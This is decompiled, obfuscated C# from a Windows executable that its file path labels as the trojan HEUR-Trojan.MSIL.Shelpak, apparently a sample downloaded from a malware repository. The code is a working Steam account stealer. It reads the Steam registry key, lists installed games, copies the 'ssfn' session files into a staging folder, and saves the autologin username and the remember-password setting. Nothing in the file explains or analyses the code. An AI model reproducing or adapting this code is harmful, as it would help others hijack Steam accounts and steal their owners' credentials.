// Decompiled with JetBrains decompiler
// Type: 黑廴彡生口冂亠夕女寸毋.殳丨彡入自十邑巛彡金二毋鹿歹
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using Microsoft.Win32;
using System.IO;
using 火長宀舛火尸彐方自儿丿广;

namespace 黑廴彡生口冂亠夕女寸毋
{
  internal sealed class 殳丨彡入自十邑巛彡金二毋鹿歹
  {
    public static bool 毛卩辵幺艮小甘隶靑手亠瓦(string 舌豆士谷火干舟力丨又殳足匸工)
    {
      try
      {
        RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
        if (registryKey1 == null)
          return false;
        string path = registryKey1.GetValue("SteamPath").ToString();
        if (!Directory.Exists(path))
          return false;
        Directory.CreateDirectory(舌豆士谷火干舟力丨又殳足匸工);
        foreach (string subKeyName in registryKey1.OpenSubKey("Apps").GetSubKeyNames())
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey("Apps\\" + subKeyName))
          {
            string str1 = (string) registryKey2.GetValue("Name");
            string str2 = string.IsNullOrEmpty(str1) ? "Unknown" : str1;
            string str3 = (int) registryKey2.GetValue("Installed") == 1 ? "Yes" : "No";
            string str4 = (int) registryKey2.GetValue("Running") == 1 ? "Yes" : "No";
            string str5 = (int) registryKey2.GetValue("Updating") == 1 ? "Yes" : "No";
            File.AppendAllText(舌豆士谷火干舟力丨又殳足匸工 + "\\Apps.txt", "Application " + str2 + "\n\tGameID: " + subKeyName + "\n\tInstalled: " + str3 + "\n\tRunning: " + str4 + "\n\tUpdating: " + str5 + "\n\n");
          }
        }
        foreach (string file in Directory.GetFiles(path))
        {
          if (file.Contains("ssfn"))
            File.Copy(file, 舌豆士谷火干舟力丨又殳足匸工 + "\\" + Path.GetFileName(file));
        }
        丿士止土巾幺山田巾弋宀小.干斤辵冖弓冫文車走穴見冖卜爿氏 = true;
        string str = (int) registryKey1.GetValue("RememberPassword") == 1 ? "Yes" : "No";
        string contents = string.Format("\nAutologin User: " + registryKey1.GetValue("AutoLoginUser")?.ToString() + "\nRemember password: " + str);
        File.WriteAllText(舌豆士谷火干舟力丨又殳足匸工 + "\\SteamInfo.txt", contents);
        return true;
      }
      catch
      {
        return false;
      }
    }
  }
}
